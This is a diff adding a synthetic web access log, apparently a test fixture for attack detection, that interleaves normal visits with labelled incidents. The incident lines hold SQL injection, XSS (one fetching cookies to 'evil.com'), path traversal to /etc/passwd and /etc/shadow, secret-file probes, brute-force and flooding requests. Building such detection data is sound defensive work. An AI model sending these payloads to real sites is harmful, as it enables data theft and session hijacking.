@@ -1,0 +1,73 @@
+192.168.1.10 - - [10/May/2024:14:00:01 +0000] "GET / HTTP/1.1" 200 4520 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.10 - - [10/May/2024:14:00:03 +0000] "GET /css/style.css HTTP/1.1" 200 1204 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.10 - - [10/May/2024:14:00:04 +0000] "GET /js/app.js HTTP/1.1" 200 8920 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.10 - - [10/May/2024:14:00:15 +0000] "GET /products HTTP/1.1" 200 15420 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+172.16.0.22 - - [10/May/2024:14:00:20 +0000] "GET /about HTTP/1.1" 200 3210 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+172.16.0.22 - - [10/May/2024:14:00:25 +0000] "GET /contact HTTP/1.1" 200 2890 "https://example.com/about" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+10.0.0.5 - - [10/May/2024:14:00:30 +0000] "GET /images/banner.png HTTP/1.1" 304 0 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64)"
+10.0.0.5 - - [10/May/2024:14:00:32 +0000] "GET /api/v1/items?category=books HTTP/1.1" 200 4890 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+
+# --- INCIDENT 1: SQL Injection Campaign (203.0.113.45) ---
+203.0.113.45 - - [10/May/2024:14:01:00 +0000] "GET /products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users HTTP/1.1" 500 1420 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+203.0.113.45 - - [10/May/2024:14:01:05 +0000] "POST /login?user=admin'%20or%20'1'='1'-- HTTP/1.1" 200 3410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+203.0.113.45 - - [10/May/2024:14:01:12 +0000] "GET /api/search?q=1;%20SLEEP(5)-- HTTP/1.1" 200 890 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+203.0.113.45 - - [10/May/2024:14:01:20 +0000] "GET /items?name=test'%20OR%20'a'='a HTTP/1.1" 200 1250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+# --- Benign Interspersed Traffic ---
+192.168.1.15 - - [10/May/2024:14:01:25 +0000] "GET /faq HTTP/1.1" 200 2310 "https://google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
+192.168.1.15 - - [10/May/2024:14:01:30 +0000] "GET /cart HTTP/1.1" 200 4120 "https://example.com/products" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
+
+# --- INCIDENT 2: Cross-Site Scripting (XSS) Attack (198.51.100.22) ---
+198.51.100.22 - - [10/May/2024:14:02:00 +0000] "GET /feedback?msg=<script>alert('xss')</script> HTTP/1.1" 200 3100 "-" "Mozilla/5.0"
+198.51.100.22 - - [10/May/2024:14:02:10 +0000] "GET /search?q=%3Cscript%3Efetch('http://evil.com?c='+document.cookie)%3C/script%3E HTTP/1.1" 200 2150 "-" "Mozilla/5.0"
+198.51.100.22 - - [10/May/2024:14:02:22 +0000] "GET /profile?name=test<img%20src=x%20onerror=alert(1)> HTTP/1.1" 400 950 "-" "Mozilla/5.0"
+198.51.100.22 - - [10/May/2024:14:02:35 +0000] "GET /redirect?url=javascript:eval(document.cookie) HTTP/1.1" 403 450 "-" "Mozilla/5.0"
+
+# --- INCIDENT 3: Path Traversal & Sensitive Files (198.51.100.89) ---
+198.51.100.89 - - [10/May/2024:14:03:00 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 340 "-" "curl/7.68.0"
+198.51.100.89 - - [10/May/2024:14:03:05 +0000] "GET /view?path=%2e%2e%2f%2e%2e%2fetc/shadow HTTP/1.1" 404 280 "-" "curl/7.68.0"
+198.51.100.89 - - [10/May/2024:14:03:10 +0000] "GET /.env HTTP/1.1" 404 220 "-" "curl/7.68.0"
+198.51.100.89 - - [10/May/2024:14:03:15 +0000] "GET /.git/config HTTP/1.1" 403 310 "-" "curl/7.68.0"
+198.51.100.89 - - [10/May/2024:14:03:20 +0000] "GET /wp-config.php HTTP/1.1" 404 220 "-" "curl/7.68.0"
+198.51.100.89 - - [10/May/2024:14:03:25 +0000] "GET /backup.sql HTTP/1.1" 404 220 "-" "curl/7.68.0"
+
+# --- INCIDENT 4: Credential Brute Force Attack (185.220.101.5) ---
+185.220.101.5 - - [10/May/2024:14:04:01 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 240 "-" "Hydra/9.2"
+185.220.101.5 - - [10/May/2024:14:04:04 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 240 "-" "Hydra/9.2"
+185.220.101.5 - - [10/May/2024:14:04:07 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 240 "-" "Hydra/9.2"
+185.220.101.5 - - [10/May/2024:14:04:10 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 240 "-" "Hydra/9.2"
+185.220.101.5 - - [10/May/2024:14:04:13 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 240 "-" "Hydra/9.2"
+185.220.101.5 - - [10/May/2024:14:04:16 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 240 "-" "Hydra/9.2"
+
+# --- INCIDENT 5: Automated Vulnerability Scanner & 404 Probe (192.241.220.11) ---
+192.241.220.11 - - [10/May/2024:14:05:00 +0000] "GET /admin HTTP/1.1" 404 280 "-" "Nikto/2.1.6"
+192.241.220.11 - - [10/May/2024:14:05:02 +0000] "GET /phpmyadmin HTTP/1.1" 404 280 "-" "Nikto/2.1.6"
+192.241.220.11 - - [10/May/2024:14:05:04 +0000] "GET /manager/html HTTP/1.1" 404 280 "-" "Nikto/2.1.6"
+192.241.220.11 - - [10/May/2024:14:05:06 +0000] "GET /shell.php HTTP/1.1" 404 280 "-" "Nikto/2.1.6"
+192.241.220.11 - - [10/May/2024:14:05:08 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 404 280 "-" "Nikto/2.1.6"
+192.241.220.11 - - [10/May/2024:14:05:10 +0000] "GET /console HTTP/1.1" 404 280 "-" "Nikto/2.1.6"
+
+# --- INCIDENT 6: Denial of Service (DoS) / Request Flooding (45.33.32.156) ---
+45.33.32.156 - - [10/May/2024:14:06:01 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:01 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:02 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:02 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:03 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:03 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:04 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:04 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:05 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:05 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:06 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:06 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:07 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:07 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:08 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:08 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:09 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+45.33.32.156 - - [10/May/2024:14:06:09 +0000] "GET /api/v1/products/stream HTTP/1.1" 200 8920 "-" "AttackBot/1.0"
+
+# --- Legitimate User Checkout & Navigation ---
+10.0.0.88 - - [10/May/2024:14:06:15 +0000] "GET /checkout HTTP/1.1" 200 5280 "https://example.com/cart" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+10.0.0.88 - - [10/May/2024:14:06:20 +0000] "POST /api/v1/order HTTP/1.1" 201 1040 "https://example.com/checkout" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+10.0.0.88 - - [10/May/2024:14:06:25 +0000] "GET /order/confirmation HTTP/1.1" 200 3980 "https://example.com/checkout" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
